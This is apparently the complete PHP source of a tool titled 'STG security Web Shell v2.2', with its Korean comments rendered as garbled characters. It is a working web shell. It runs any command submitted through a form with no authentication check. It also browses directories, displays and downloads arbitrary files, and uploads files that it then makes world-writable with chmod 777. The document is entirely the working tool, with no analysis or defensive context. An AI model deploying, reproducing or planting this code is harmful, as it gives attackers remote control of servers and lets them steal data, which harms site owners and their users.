<?php

$version = "2.2";

/* Global �ɼ��� �����ϴ��� ���ο� ���� */
if(($page = $_SERVER['PHP_SELF']) != "") {
        $cmd = $_POST['cmd'];                                                        // ���
        $tmp_file = $_FILES['up_file']['tmp_name'];                 // �ӽ� ���ϸ�
        $up_file_name = $_FILES['up_file']['name'];                // ���ε�Ǵ� ���ϸ�

        /* GET���� POST������ ���� */
        if(($method = $_SERVER['REQUEST_METHOD']) == "POST") {
                $loc = $_POST['loc'];
        } else {
                $loc = $_GET['loc'];
                $whatmode = $_GET['whatmode'];
        }
} else {
        $method = $HTTP_SERVER_VARS['REQUEST_METHOD'];
        $cmd = $cmd;
        $page = $PHP_SELF;
        $loc = $loc;
        $whatmode = $whatmode;
        $tmp_file = $HTTP_POST_FILES['up_file']['tmp_name'];
        $up_file_name = $HTTP_POST_FILES['up_file']['name'];
}

/* ������ ������ ����ϴ� �Լ� */
function getPerm($file) {
        $in_Perms = filePerms($file);
        $sp;

        if($in_Perms & 0x1000) $sp = 'p';                        // FIFO pipe;
        elseif($in_Perms & 0x2000) $sp = 'c';                // Caracter special
        elseif($in_Perms & 0x4000) $sp = 'd';                // Direcotry
        elseif($in_Perms & 0x6000) $sp = 'b';                // Block special
        elseif($in_Perms & 0x8000) $sp = '?';        // Regular
        elseif($in_Perms & 0xA000) $sp = 'l';                 // Symbolic Link
        elseif($in_Perms & 0xC000) $sp = 's';                // Socket
        else $sp = 'u';                                                                // UNKONWN

        // owner
        $sp .= (($in_Perms & 0x0100) ? 'r' : '?') .
                  (($in_Perms & 0x0080) ? 'w' : '?') .
                  (($in_Perms & 0x0040) ? (($in_Perms & 0x0800) ? 's' : 'x') :
                                          (($in_Perms & 0x0800) ? 'S' :
                                                                   '?'));
        // group
        $sp .= (($in_Perms & 0x0020) ? 'r' : '?') .
                  (($in_Perms & 0x0010) ? 'w' : '?') .
                  (($in_Perms & 0x0008) ? (($in_Perms & 0x0400) ? 's' : 'x') :
                                          (($in_Perms & 0x0400) ? 'S' :
                                                                   '?'));
        // other
        $sp .= (($in_Perms & 0x0004) ? 'r' : '?') .
                  (($in_Perms & 0x0002) ? 'w' : '?') .
                  (($in_Perms & 0x0001) ? (($in_Perms & 0x0200) ? 's' : 'x') :
                                          (($in_Perms & 0x0200) ? 'S' :
                                                                   '?'));
        return $sp;
}

/* ���丮�� ����Ʈ�� ����ϴ� �Լ� */
function listf($rpath) {
        global $page;

        $ctime = getdate();                        // ���� �ð�
        $cyear = $ctime['year'];        // ���� �⵵
        if(is_readable($rpath)) {
                $dh  = opendir($rpath);

                /* ���̺� ��� */
                echo "<table border=\"0\">\n";
                while(false !== ($file = readdir($dh))) {
                        /* ������ ��ü ��� */
                        if($rpath == "/") {
                                $full_name = $rpath . $file;
                        } else {
                                $full_name = $rpath . "/" . $file;
                        }
                        $perm = getPerm($full_name);
                        /* ���� ������� ���� ����, �ƴ϶�� �ش� ������ ��� */
                        if($cyear == date("Y", filemtime($full_name))) {
                                $mtime = date("M d D h:i", filemtime($full_name));
                        } else {
                                $mtime = date("M d D Y", filemtime($full_name));
                        }
                        $owner = fileowner($full_name);
                        $group = filegroup($full_name);
                        $size = filesize($full_name);
                        $type = filetype($full_name);

                        /* ���� ���丮��� */
                        if(is_dir($full_name)) {
                                echo "<tr>\n";
                                echo "<td nowrap align=\"right\">$perm</td>\n";
                                echo "<td nowrap> </td>\n";
                                echo "<td nowrap align=\"right\">$owner</td>\n";
                                echo "<td nowrap> </td>\n";
                                echo "<td nowrap align=\"right\">$group</td>\n";
                                echo "<td nowrap> </td>\n";
                                echo "<td nowrap>$mtime</td>\n";
                                echo "<td nowrap> </td>\n";
                                echo "<td nowrap align=right>$size</td>\n";
                                echo "<td nowrap>$type</td>\n";
                                echo "<td nowrap> </td>\n";
                                echo "<td nowrap align=\"left\"><a
                                        href=\"$page?loc=$full_name&whatmode=list\">$file</a></td>\n";
                                echo "</tr>\n";
                        /* �����̶�� */
                        } else {
                                echo "<tr>\n";
                                echo "<td nowrap align=\"right\">$perm</td>\n";
                                echo "<td nowrap> </td>\n";
                                echo "<td nowrap align=\"right\">$owner</td>\n";
                                echo "<td nowrap> </td>\n";
                                echo "<td nowrap align=\"right\">$group</td>\n";
                                echo "<td nowrap> </td>\n";
                                echo "<td nowrap>$mtime</td>\n";
                                echo "<td nowrap> </td>\n";
                                echo "<td nowrap align=right>$size</td>\n";
                                echo "<td nowrap> </td>\n";
                                echo "<td nowrap><a
                                        href=\"$page?loc=$full_name&whatmode=download\">[D]</a></td>\n";
                                echo "<td nowrap><a
                                        href=\"$page?loc=$full_name&whatmode=view\">$file</a></td>\n";
                                echo "</tr>\n";
                        }
                }
                echo "</table>";
                closedir($dh);
        } else {
                echo "<br>Don't have right permission!";
        }

}

/* ������ ������ ���� �Լ� */
function viewf($file) {
        global $page;

        if(is_readable($file)) {
                $fp = fopen($file, "r");
                $contents = fread($fp, filesize($file));
                echo "<xmp>\n";
                echo "$contents";
        } else {
                echo "Don't have right permission!";
        }
}

/* ���� �ٿ�ε� �Լ� */
function downf($rpath) {
        $file_name = basename($rpath);
        $dnfile = urlencode($file_name);

        /* HEADER */
        header("Content-Type: application/octet-stream");
        header("Content-Length: " . filesize("$rpath"));
        header("Content-Disposition: attachment; filename=$dnfile");
        header("Content-Transfer-Encoding: binary");
        header("Pragma: no-cache");
        header("Expires: 0");

        if(is_file("$rpath")) {
                $fp = fopen("$rpath", "r");
                if(!fpassthru($fp)) fclose($fp);
        } else {
                echo "�ش� �����̳� ��ΰ� �������� �ʽ��ϴ�.";
        }
}

/* html ��� �Լ� */
function _head() {
        global $version;

        echo "<html>\n";
        echo "<head><title>STG security Web Shell v" . $version . "</title></head>\n";
        echo "<body>\n";
        echo "<font face=fixedsys>\n";
}

/* html FORM �Լ� */
function _form($loc) {
        global $page;

        /* �����̶�� ���丮�� */
        if(is_file($loc)) {
                $current = eregi_replace(strrchr($loc, "/"), "", $loc);
        } else {
                $current = $loc;
        }

        echo "<form name=\"stg\" method=\"post\" action=\"$page\"
                enctype=\"multipart/form-data\">
                <b>[$current]</b>
                <input type=\"text\" name=\"cmd\" size=\"70\">
                <input type=\"submit\" name=\"submit\" value=\"Run\">
                <br>
                Upload Path :
                <input type=\"text\" name=\"loc\" value=\"$current\">
                Upload File :
                <input type=\"file\" name=\"up_file\">
                </form>\n";

        /* ���� ���丮�� �̵� */
        if(!empty($loc)) {
                $upper = eregi_replace(strrchr($loc, "/"), "", $loc);
                if(empty($upper)) {
                        $upper = "/";
                }
        } else {
                $upper = "/";
        }

        echo "[Dir: <a href=\"$page?loc=$upper&whatmode=list\">$current</a>]\n";
}

/* ���� ���ν��� */
/* POST ��� */
if($method == "POST") {
        /* ���� ���ε��� ��� */
        if(!empty($tmp_file) && $tmp_file != 'none') {
                $dest = $loc . "/" . $up_file_name;
                copy($tmp_file, $dest);
                system("chmod 777 $dest");
                header("Location: $page?loc=$loc&whatmode=list");
        } else {
                _head();
                _form($loc);
                echo "<xmp>\n";
                system("($cmd) 2>&1");
        }

/* GET�� ��� */
} else {
        /* ���� ���丮 �ʱ�ȭ */
        if($loc == "" | $whatmode == "") {
                $loc = ".";
                $whatmode = "list";
        }

        /* ���丮���� ���� ����Ʈ �޾ƿ��� */
        $rpath = realpath($loc);

        /* Mode �� */
        switch($whatmode) {
                case "list":
                        _head();
                        _form($rpath);
                        listf($rpath);
                        break;
                case "view":
                        _head();
                        _form($rpath);
                        viewf($rpath);
                        break;
                case "download":
                        downf($rpath);
                        break;
                default:
                        echo "Non!";
                        break;
        }
}
